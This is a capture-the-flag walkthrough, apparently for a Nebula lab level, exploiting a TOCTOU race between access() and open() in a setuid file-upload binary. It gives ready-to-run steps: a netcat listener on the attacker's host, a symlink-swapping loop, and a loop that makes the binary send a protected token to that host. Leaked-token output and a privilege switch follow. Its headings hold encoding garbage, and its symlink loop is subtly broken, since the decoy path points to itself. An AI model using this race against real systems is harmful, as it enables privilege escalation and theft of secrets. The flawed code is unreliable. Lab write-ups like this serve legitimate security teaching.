
---
### ğŸ” Challenge Description

> The binary at `/home/flag10/flag10` uploads any file passed as an argument, **only if the calling user has access to read it**.  
> The program uses `access()` to check permissions â€” introducing a classic **TOCTOU (Time-Of-Check-To-Time-Of-Use)** vulnerability.

**Login:** `level10 : level10`  
**Target binary:** `/home/flag10/flag10`  
**Hidden file:** `/home/flag10/token` (readable only by `flag10`)

---

### ğŸ“œ Source Code Analysis

```c
if(access(argv[1], R_OK) == 0) {
   ...
   ffd = open(file, O_RDONLY);
   ...
}
```

ğŸ§  **Key Insight:**  
`access()` uses the **real UID/GID**, while `open()` uses the **effective UID/GID**.  
This gap allows a **race condition** â€” check permission on a dummy file, then swap it with the protected file before `open()` is called.

---

### ğŸ¯ Goal

Exploit the time gap between the access check and the file open call to leak the contents of `token` using a symbolic link attack.

---

### âš”ï¸ Exploitation Plan

#### ğŸ§± Step 1: Create a Decoy File

```bash
echo "Here I have full access." > /tmp/token
```

#### ğŸ” Step 2: Launch a Netcat Listener on Your Host

_On your host machine:_

```bash
nc -lk 18211
```

This will receive the file sent by the vulnerable binary.

#### ğŸ”— Step 3: Start the Symlink Race (Terminal 1 in VM)

```bash
while true; do
    ln -sf /home/flag10/token /tmp/token
    ln -sf /tmp/token /tmp/token
done
```

Keep toggling the symlink between a **dummy file** and the **real token**.

#### ğŸš€ Step 4: Rapidly Trigger the Binary (Terminal 2 in VM)

```bash
while true; do
    /home/flag10/flag10 /tmp/token <YOUR-HOST-IP>
done
```

This will keep sending the contents of `/tmp/token` to your host over TCP â€” eventually during a successful race window, it will grab the protected token.

---

### ğŸ Step 5: Capture the Flag

_On your host (where `nc` is running)_

```bash
.oO Oo.
Here I have full access.
.oO Oo.
Here I have full access.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27   <-- ğŸ† This is the token!
```

---

### ğŸ” Step 6: Switch to `flag10` and Win

```bash
ssh flag10@localhost
# password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Then:

```bash
getflag
```

âœ… Output:

```
You have successfully executed getflag on a target account
```

---

### ğŸ§  Lessons Learned

This level illustrates the danger of **TOCTOU vulnerabilities** â€” where permission checks and usage are done separately. These are often subtle and timing-dependent but can lead to **severe privilege escalation**.

ğŸ›¡ï¸ **Security Tip:**

> Replace `access()` checks with direct `open()` calls using appropriate privileges. If a check must be done, do it using the same logic path and UID that performs the final operation.

---
